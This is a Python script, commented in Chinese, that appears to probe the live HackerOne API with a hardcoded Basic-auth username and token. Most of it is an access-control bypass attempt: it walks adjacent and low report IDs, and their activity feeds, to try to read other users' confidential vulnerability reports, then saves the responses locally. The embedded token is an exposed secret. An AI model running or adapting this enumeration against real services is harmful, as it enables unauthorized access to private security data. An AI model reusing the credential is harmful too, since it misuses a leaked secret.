# -*- coding: utf-8 -*-
"""H1 API v1 探测:Basic auth (base_alert) 官方 API 面"""
import base64
import json
import time
import urllib.request
import urllib.error

TOKEN = "bF9gJTA7TeKMC+ADx6hrKefniB6dxtJu5JlT4L/GROE="
AUTH = base64.b64encode(("base_alert:" + TOKEN).encode()).decode()
BASE = "https://api.hackerone.com/v1"

OUT = []


def req(path, method="GET"):
    url = BASE + path
    r = urllib.request.Request(url, method=method)
    r.add_header("Authorization", "Basic " + AUTH)
    r.add_header("Accept", "application/json")
    try:
        with urllib.request.urlopen(r, timeout=20) as resp:
            body = resp.read().decode("utf-8", "replace")
            OUT.append("===== %s %s\nHTTP %s\n%s" % (method, path, resp.status, body[:600]))
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", "replace")
        OUT.append("===== %s %s\nHTTP %s\n%s" % (method, path, e.code, body[:600]))
    except Exception as e:
        OUT.append("===== %s %s\nERR %s" % (method, path, e))


# 1) 身份确认
req("/hackers/me")
time.sleep(0.8)

# 2) 常见顶层端点(判断 API 层数据面)
for p in ["/me", "/users/me", "/hackers/base_alert",
          "/reports?page[size]=3",
          "/hackers/4421190/reports?page[size]=3"]:
    req(p)
    time.sleep(0.8)

# 3) 越权样本 + 邻号
for rid in ["3732660", "3732659", "3732661", "1"]:
    req("/reports/%s" % rid)
    time.sleep(0.8)
    req("/reports/%s/activities?page[size]=3" % rid)
    time.sleep(0.8)

# 4) team/program 公开面
for t in ["bug_bounty_program", "security", "gitlab"]:
    req("/teams/%s" % t)
    time.sleep(0.8)

with open(r"D:\scan\h1kit\_h1x134_api_probe_out.txt", "w", encoding="utf-8") as f:
    f.write("\n\n".join(OUT))
print("done, %d results" % len(OUT))
